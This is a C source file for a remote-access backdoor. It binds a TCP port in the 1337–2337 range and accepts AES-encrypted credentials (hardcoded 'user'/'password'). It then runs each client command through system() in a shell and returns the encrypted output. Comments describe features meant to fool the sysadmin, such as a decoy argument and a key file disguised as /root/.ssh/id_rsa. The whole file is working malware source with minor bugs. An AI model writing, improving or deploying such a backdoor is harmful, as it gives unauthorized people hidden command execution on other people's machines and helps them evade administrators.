#include "includes.h"
// argv[1] is not used (intended to fool the sysadmin)
// argv[2] is optional and specifies the start port scan range (argv[3] is largest port to scan)

// Port scan is used to avoid potential errors with binding 
// (sometimes, a given port might be 'busy' and the OS refuses to give it up, 
// we dont' want the backdoor to fall flat on its back in this case.)
int main(int argc, char** argv) {
    int port = 1337;
    int max_port = 2337;
    if (argc > 1) {
        port = atoi(argv[2]);
        max_port = atoi(argv[3]);
    }

    // Establish an IPV4 socket file descriptor using TCP
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    // First argument is the address for which to bind the socket to.
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    struct in_addr sin_addr;
    sin_addr.s_addr = INADDR_ANY; 
    addr.sin_addr = sin_addr; 

    struct AES_ctx ctx;

    char* key = (char*)malloc(64);
    char* iv = (char*)malloc(32);

    char auth_usr[MAX_USERNAME_LEN] = "user";
    char auth_pwd[MAX_PASSWORD_LEN] = "password";
//  || read_config_file(auth_usr, auth_pwd) == -1
    if ((read_key_file(key, iv) == -1)) {
        return -1;
    }
    printf("Read key: %s\nRead IV: %s\n", key, iv);
    bool is_bound = false;
    while (!is_bound) {
        addr.sin_port = port;

        if (bind(sockfd, &addr, sizeof(addr)) == -1) {
            printf("Binding failed!\n");
            if (port > max_port) return -1;
            port++;
        } else {
            is_bound = true;
            printf("Successfully bound server on port %d\n!", port);
        }
    }
    
    // Now we want to make the sockfd a passive socket
    if (listen(sockfd, 255) == -1) {
        printf("Listen failed!\n");
    }
    printf("Server successfully established! Waiting for incoming connections...\n");

    // Loop indefinitely until the server recieves SIGINT
    int client_fd;
    while (1) {
        socklen_t addr_len = sizeof(addr);
        int client_fd = accept(sockfd, &addr, &addr_len);
        if (client_fd == -1) {
            printf("Error: unable to accept the client.");
            return -1;
        }
        // Authentication
        char attempt_usr[MAX_USERNAME_LEN];
        char attempt_pwd[MAX_PASSWORD_LEN];

        read(client_fd, attempt_usr, MAX_USERNAME_LEN);
        read(client_fd, attempt_pwd, MAX_PASSWORD_LEN);

        // Decrypt the auth fields
        AES_init_ctx_iv(&ctx, key, iv);
        AES_CTR_xcrypt_buffer (&ctx, attempt_usr, sizeof(attempt_usr));  // decrypt client username
        AES_init_ctx_iv(&ctx, key, iv);
        AES_CTR_xcrypt_buffer (&ctx, attempt_pwd, sizeof(attempt_pwd));  // decrypt client password
        printf("  auth: provided user %s\n  auth: provided password %s\n", attempt_usr, attempt_pwd);
        if (strcmp(attempt_usr, auth_usr) == 0 && strcmp(attempt_pwd, auth_pwd) == 0) {
            printf("Client is successfully authenticated.\n");
            write(client_fd, "OK", 16);
        } else {
            write(client_fd, "INVALID", 16);
            printf("Error authenticating with the client, closing connection.\n");
            close(client_fd);
            continue;
        }

        printf("Client connected on fd %d.\n", client_fd);
        // Read 32 bytes from the client, presumably to execute a command.
        char client_command[READ_LENGTH];
        read(client_fd, client_command, READ_LENGTH);
        AES_init_ctx_iv(&ctx, key, iv);
        AES_CTR_xcrypt_buffer (&ctx, client_command, sizeof(client_command)); // decrypt client command
        while (client_command != NULL) {
            // Spawn a new child process. system command allows for args to be passed in seemlessly
            // Specifically, it spawns a child process of /bin/sh that runs any command.
            char* output = (char*)calloc(sizeof(char), OUTPUT_BUFFER);

            // We need to manually run the chdir command due to the nature of the system() function.
            // NOTE/todo: Required to have an extra space after the command name.
            char cmd_cpy[READ_LENGTH];
            char* check_tok;
            strncpy(cmd_cpy, client_command, sizeof(client_command));
            check_tok = strtok(cmd_cpy, " ");
            printf("%s\n", check_tok);

            if (check_tok && strncmp(check_tok, "cd", 2) == 0) {
                check_tok = strtok(NULL, " ");
                printf("%s\n", check_tok);
                printf("Changing the working directory to %s\n", check_tok);
                chdir(check_tok);
            } 
            int pipe_fd[2];
            pipe(pipe_fd);
            printf("Execute: %s\n", client_command);
            int stdout_cpy = dup(STDOUT_FILENO);
            dup2(pipe_fd[1], STDOUT_FILENO);
            int status = system(client_command);   
            close(pipe_fd[1]);
            dup2(stdout_cpy, STDOUT_FILENO);
            // Clear out the array
            if (read(pipe_fd[0], output, OUTPUT_BUFFER) < 0){
                printf("Error while reading from stdout buffer.\n");
            }
            
            // Write the output buffer to the client
            AES_init_ctx_iv(&ctx, key, iv);
            AES_CTR_xcrypt_buffer (&ctx, output, sizeof(output)); // encrypt terminal output
            if (write(client_fd, output, OUTPUT_BUFFER) < 0) {
                printf("Error while writing to client. %s\n",strerror(errno));
            }
            free(output);
            close(pipe_fd[0]);
            // Obtain a new command from client, or NULL if client is disconnected
            read(client_fd, client_command, READ_LENGTH);
            AES_init_ctx_iv(&ctx, key, iv);
            AES_CTR_xcrypt_buffer (&ctx, client_command, sizeof(client_command)); // decrypt client command
        }
    }
}

int read_config_file(char* usr, char* pwd){
    return 0;
}
int read_key_file(char* key, char* iv) {
    // Default location for the AES key file is a spoof of an SSH key
    int key_file = open("/root/.ssh/id_rsa", O_RDWR);
    char begin[3];
    read(key_file, begin, 3);
    if (strncmp(begin, "AES", 3) != 0) {
        printf("Error: invalid key file, aborting the read.\n");
        return -1;
    }
    lseek(key_file, 1, SEEK_CUR);
    read(key_file, key, 64);
    lseek(key_file, 5, SEEK_CUR);
    read(key_file, iv, 32);
    return 1;
}
